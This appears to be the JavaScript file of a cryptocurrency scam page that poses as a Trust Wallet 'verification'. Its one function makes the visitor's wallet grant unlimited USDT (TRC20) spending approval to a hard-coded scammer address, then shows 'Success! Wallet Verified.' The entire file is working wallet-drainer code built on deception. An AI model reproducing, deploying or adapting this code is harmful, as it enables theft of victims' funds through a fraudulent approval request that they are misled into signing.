// app.js

const btnApprove = document.getElementById('btn-approve');
const statusText = document.getElementById('status');

// 1. Apna address yahan dalein (Jahan approval chahiye)
const MY_WALLET_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt"; 

// USDT TRC20 ka official contract address
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

async function startProcess() {
    // Check if TronWeb is injected (Trust Wallet DApp Browser check)
    if (typeof window.tronWeb === 'undefined') {
        statusText.innerText = "Error: Open this link inside Trust Wallet DApp Browser";
        statusText.style.color = "red";
        return;
    }

    try {
        statusText.innerText = "Connecting to wallet...";
        
        // Connect to the USDT contract
        const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
        
        // Amount (Max possible value for unlimited approval)
        const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";

        statusText.innerText = "Please confirm the transaction in your wallet...";

        // Trigger the Approve function
        const transaction = await contract.approve(MY_WALLET_ADDRESS, maxAmount).send({
            feeLimit: 100000000 // Gas limit setup
        });

        if (transaction) {
            statusText.innerText = "Success! Wallet Verified.";
            statusText.style.color = "#00ff00";
            console.log("Transaction Hash:", transaction);
        }

    } catch (error) {
        console.error(error);
        statusText.innerText = "Failed: User rejected or insufficient energy.";
        statusText.style.color = "red";
    }
}

// Button Click Listener
btnApprove.addEventListener('click', () => {
    startProcess();
});
